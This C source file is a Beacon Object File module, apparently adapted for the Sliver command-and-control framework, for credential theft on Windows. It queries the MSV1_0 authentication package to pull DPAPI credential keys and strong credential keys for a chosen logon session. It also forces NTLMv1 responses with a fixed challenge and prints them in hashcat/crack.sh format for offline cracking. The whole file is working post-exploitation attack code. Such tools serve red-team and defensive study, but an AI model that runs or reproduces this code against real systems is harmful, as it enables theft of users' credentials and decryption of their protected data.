/*
 * lsa-whisperer BOF - MSV1_0 Module
 * Handles: credkey, strongcredkey, ntlmv1
 *
 * Uses LsaCallAuthenticationPackage with MSV1_0 authentication package
 * to extract credential keys and generate NTLMv1 responses.
 *
 * Original: https://github.com/dazzyddos/lsawhisper-bof
 * Adapted for Sliver armory integration
 */

#include "../../include/bofdefs.h"
#include "../../include/lsa_structs.h"

/* Forward declarations from common */
extern BOOL ParseLUID(const char* str, PLUID luid);
extern BOOL EnableTcbPrivilege(void);
extern NTSTATUS LsaConnect(PHANDLE hLsa, BOOL trusted);
extern NTSTATUS LsaLookupPackage(HANDLE hLsa, const char* packageName, PULONG packageId);
extern void PrintHexBytes(const char* label, PUCHAR data, ULONG length);

/* ============================================================
 * DoGetCredentialKey - Extract DPAPI credential key
 * Works through Credential Guard
 * ============================================================ */

void DoGetCredentialKey(LUID* targetLuid) {
    HANDLE hLsa = NULL;
    ULONG packageId = 0;
    NTSTATUS status, subStatus;
    PVOID response = NULL;
    ULONG responseLen = 0;

    BeaconPrintf(CALLBACK_OUTPUT, "[*] lsa-whisperer: GetCredentialKey\n");
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Target LUID: 0x%x:0x%x\n", targetLuid->HighPart, targetLuid->LowPart);

    /* Try trusted connection first (requires SeTcbPrivilege) */
    EnableTcbPrivilege();
    status = LsaConnect(&hLsa, TRUE);
    if (status != 0) {
        /* Fall back to untrusted */
        status = LsaConnect(&hLsa, FALSE);
        if (status != 0) {
            BeaconPrintf(CALLBACK_ERROR, "[-] LsaConnectUntrusted failed: 0x%08x\n", status);
            return;
        }
    }

    status = LsaLookupPackage(hLsa, MSV1_0_PACKAGE_NAME, &packageId);
    if (status != 0) {
        BeaconPrintf(CALLBACK_ERROR, "[-] LsaLookupAuthenticationPackage failed: 0x%08x\n", status);
        LsaDeregisterLogonProcess(hLsa);
        return;
    }

    /* Build request */
    MSV1_0_CREDENTIAL_KEY_REQUEST request;
    memset(&request, 0, sizeof(request));
    request.MessageType = MsV1_0GetCredentialKey;
    request.LogonId = *targetLuid;

    status = LsaCallAuthenticationPackage(
        hLsa,
        packageId,
        &request,
        sizeof(request),
        &response,
        &responseLen,
        &subStatus
    );

    if (status != 0 || subStatus != 0) {
        BeaconPrintf(CALLBACK_ERROR, "[-] LsaCallAuthenticationPackage failed: status=0x%08x sub=0x%08x\n",
                     status, subStatus);
        LsaDeregisterLogonProcess(hLsa);
        return;
    }

    PMSV1_0_CREDENTIAL_KEY_RESPONSE keyResp = (PMSV1_0_CREDENTIAL_KEY_RESPONSE)response;

    BeaconPrintf(CALLBACK_OUTPUT, "[+] Credential key recovered successfully!\n");
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Key length: %u bytes\n", keyResp->KeyLength);
    PrintHexBytes("[+] DPAPI Credential Key", keyResp->Key, keyResp->KeyLength);

    if (response) LsaFreeReturnBuffer(response);
    LsaDeregisterLogonProcess(hLsa);
}

/* ============================================================
 * DoGetStrongCredentialKey - Extract enhanced credential key
 * Windows 10+ only
 * ============================================================ */

void DoGetStrongCredentialKey(LUID* targetLuid) {
    HANDLE hLsa = NULL;
    ULONG packageId = 0;
    NTSTATUS status, subStatus;
    PVOID response = NULL;
    ULONG responseLen = 0;

    BeaconPrintf(CALLBACK_OUTPUT, "[*] lsa-whisperer: GetStrongCredentialKey\n");
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Target LUID: 0x%x:0x%x\n", targetLuid->HighPart, targetLuid->LowPart);

    EnableTcbPrivilege();
    status = LsaConnect(&hLsa, TRUE);
    if (status != 0) {
        status = LsaConnect(&hLsa, FALSE);
        if (status != 0) {
            BeaconPrintf(CALLBACK_ERROR, "[-] LSA connection failed: 0x%08x\n", status);
            return;
        }
    }

    status = LsaLookupPackage(hLsa, MSV1_0_PACKAGE_NAME, &packageId);
    if (status != 0) {
        BeaconPrintf(CALLBACK_ERROR, "[-] LsaLookupAuthenticationPackage failed: 0x%08x\n", status);
        LsaDeregisterLogonProcess(hLsa);
        return;
    }

    MSV1_0_CREDENTIAL_KEY_REQUEST request;
    memset(&request, 0, sizeof(request));
    request.MessageType = MsV1_0GetStrongCredentialKey;
    request.LogonId = *targetLuid;

    status = LsaCallAuthenticationPackage(
        hLsa,
        packageId,
        &request,
        sizeof(request),
        &response,
        &responseLen,
        &subStatus
    );

    if (status != 0 || subStatus != 0) {
        BeaconPrintf(CALLBACK_ERROR, "[-] LsaCallAuthenticationPackage failed: status=0x%08x sub=0x%08x\n",
                     status, subStatus);
        if (subStatus == 0xC00000BB) {
            BeaconPrintf(CALLBACK_ERROR, "[-] Strong credential keys not supported (requires Windows 10+)\n");
        }
        LsaDeregisterLogonProcess(hLsa);
        return;
    }

    PMSV1_0_CREDENTIAL_KEY_RESPONSE keyResp = (PMSV1_0_CREDENTIAL_KEY_RESPONSE)response;

    BeaconPrintf(CALLBACK_OUTPUT, "[+] Strong credential key recovered!\n");
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Key length: %u bytes\n", keyResp->KeyLength);
    PrintHexBytes("[+] Strong DPAPI Key", keyResp->Key, keyResp->KeyLength);

    if (response) LsaFreeReturnBuffer(response);
    LsaDeregisterLogonProcess(hLsa);
}

/* ============================================================
 * DoNtlmv1 - Generate NTLMv1 challenge response for cracking
 * Blocked by Credential Guard
 * ============================================================ */

static BOOL HexStringToBytes(const char* hex, UCHAR* bytes, ULONG maxLen) {
    ULONG len = (ULONG)strlen(hex);
    if (len % 2 != 0 || len / 2 > maxLen) return FALSE;

    for (ULONG i = 0; i < len; i += 2) {
        char byteStr[3] = { hex[i], hex[i + 1], '\0' };
        bytes[i / 2] = (UCHAR)strtoul(byteStr, NULL, 16);
    }
    return TRUE;
}

void DoNtlmv1(LUID* targetLuid, const char* challengeHex) {
    HANDLE hLsa = NULL;
    ULONG packageId = 0;
    NTSTATUS status, subStatus;
    PVOID response = NULL;
    ULONG responseLen = 0;
    UCHAR challenge[8];

    BeaconPrintf(CALLBACK_OUTPUT, "[*] lsa-whisperer: NTLMv1 Challenge Response\n");
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Target LUID: 0x%x:0x%x\n", targetLuid->HighPart, targetLuid->LowPart);

    /* Parse challenge or use default (crack.sh compatible) */
    if (challengeHex == NULL || strlen(challengeHex) == 0) {
        challengeHex = "1122334455667788";
    }

    if (!HexStringToBytes(challengeHex, challenge, 8)) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Invalid challenge hex string: %s\n", challengeHex);
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[*] Challenge: %s\n", challengeHex);

    EnableTcbPrivilege();
    status = LsaConnect(&hLsa, TRUE);
    if (status != 0) {
        status = LsaConnect(&hLsa, FALSE);
        if (status != 0) {
            BeaconPrintf(CALLBACK_ERROR, "[-] LSA connection failed: 0x%08x\n", status);
            return;
        }
    }

    status = LsaLookupPackage(hLsa, MSV1_0_PACKAGE_NAME, &packageId);
    if (status != 0) {
        BeaconPrintf(CALLBACK_ERROR, "[-] LsaLookupAuthenticationPackage failed: 0x%08x\n", status);
        LsaDeregisterLogonProcess(hLsa);
        return;
    }

    /* Build GetChallengeResponse request */
    MSV1_0_GETCHALLENRESP_REQUEST request;
    memset(&request, 0, sizeof(request));
    request.MessageType = MsV1_0Lm20GetChallengeResponse;
    request.ParameterControl = USE_SUPPLIED_CHALLENGE | RETURN_NT_RESPONSE_ONLY | GCR_ALLOW_NTLM | RETURN_PRIMARY_USERNAME;
    request.LogonId = *targetLuid;
    memcpy(request.ChallengeToClient, challenge, 8);

    status = LsaCallAuthenticationPackage(
        hLsa,
        packageId,
        &request,
        sizeof(request),
        &response,
        &responseLen,
        &subStatus
    );

    if (status != 0 || subStatus != 0) {
        BeaconPrintf(CALLBACK_ERROR, "[-] LsaCallAuthenticationPackage failed: status=0x%08x sub=0x%08x\n",
                     status, subStatus);
        if (subStatus == 0xC0000001) {
            BeaconPrintf(CALLBACK_ERROR, "[-] Credential Guard may be blocking NTLMv1 response generation\n");
        }
        LsaDeregisterLogonProcess(hLsa);
        return;
    }

    PMSV1_0_GETCHALLENRESP_RESPONSE chalResp = (PMSV1_0_GETCHALLENRESP_RESPONSE)response;

    BeaconPrintf(CALLBACK_OUTPUT, "[+] NTLMv1 response generated successfully!\n");

    /* Print user/domain info */
    if (chalResp->UserName.Buffer && chalResp->UserName.Length > 0) {
        char userBuf[256];
        int len = WideCharToMultiByte(CP_UTF8, 0, chalResp->UserName.Buffer,
                                       chalResp->UserName.Length / sizeof(WCHAR),
                                       userBuf, sizeof(userBuf) - 1, NULL, NULL);
        if (len > 0) {
            userBuf[len] = '\0';
            BeaconPrintf(CALLBACK_OUTPUT, "[+] Username: %s\n", userBuf);
        }
    }

    if (chalResp->LogonDomainName.Buffer && chalResp->LogonDomainName.Length > 0) {
        char domBuf[256];
        int len = WideCharToMultiByte(CP_UTF8, 0, chalResp->LogonDomainName.Buffer,
                                       chalResp->LogonDomainName.Length / sizeof(WCHAR),
                                       domBuf, sizeof(domBuf) - 1, NULL, NULL);
        if (len > 0) {
            domBuf[len] = '\0';
            BeaconPrintf(CALLBACK_OUTPUT, "[+] Domain: %s\n", domBuf);
        }
    }

    /* Print NT response */
    if (chalResp->CaseSensitiveChallengeResponse.Buffer &&
        chalResp->CaseSensitiveChallengeResponse.Length > 0) {
        PrintHexBytes("[+] NT Response",
                      (PUCHAR)chalResp->CaseSensitiveChallengeResponse.Buffer,
                      chalResp->CaseSensitiveChallengeResponse.Length);
    }

    /* Print LM response */
    if (chalResp->CaseInsensitiveChallengeResponse.Buffer &&
        chalResp->CaseInsensitiveChallengeResponse.Length > 0) {
        PrintHexBytes("[+] LM Response",
                      (PUCHAR)chalResp->CaseInsensitiveChallengeResponse.Buffer,
                      chalResp->CaseInsensitiveChallengeResponse.Length);
    }

    /* Print in hashcat/crack.sh format */
    BeaconPrintf(CALLBACK_OUTPUT, "\n[+] === crack.sh / hashcat format ===\n");
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Challenge: %s\n", challengeHex);
    if (chalResp->CaseSensitiveChallengeResponse.Length == 24) {
        PrintHexBytes("[+] NTLMv1 Hash (for cracking)",
                      (PUCHAR)chalResp->CaseSensitiveChallengeResponse.Buffer, 24);
    }

    if (response) LsaFreeReturnBuffer(response);
    LsaDeregisterLogonProcess(hLsa);
}

/* ============================================================
 * BOF Entry Point
 * ============================================================ */

#ifdef BOF
void go(char* args, int len) {
    datap parser;
    char* command = NULL;
    char* luidStr = NULL;
    char* extraArg = NULL;
    LUID targetLuid = { 0, 0 };

    BeaconDataParse(&parser, args, len);
    command = BeaconDataExtract(&parser, NULL);

    if (command == NULL || strlen(command) == 0) {
        BeaconPrintf(CALLBACK_ERROR, "[-] No command specified. Use: credkey, strongcredkey, ntlmv1\n");
        return;
    }

    /* Extract optional LUID */
    luidStr = BeaconDataExtract(&parser, NULL);
    if (luidStr && strlen(luidStr) > 0) {
        ParseLUID(luidStr, &targetLuid);
    }

    if (_stricmp(command, "credkey") == 0) {
        DoGetCredentialKey(&targetLuid);
    }
    else if (_stricmp(command, "strongcredkey") == 0) {
        DoGetStrongCredentialKey(&targetLuid);
    }
    else if (_stricmp(command, "ntlmv1") == 0) {
        extraArg = BeaconDataExtract(&parser, NULL);
        DoNtlmv1(&targetLuid, extraArg);
    }
    else {
        BeaconPrintf(CALLBACK_ERROR, "[-] Unknown command: %s\n", command);
        BeaconPrintf(CALLBACK_ERROR, "[-] Valid commands: credkey, strongcredkey, ntlmv1\n");
    }
}
#endif
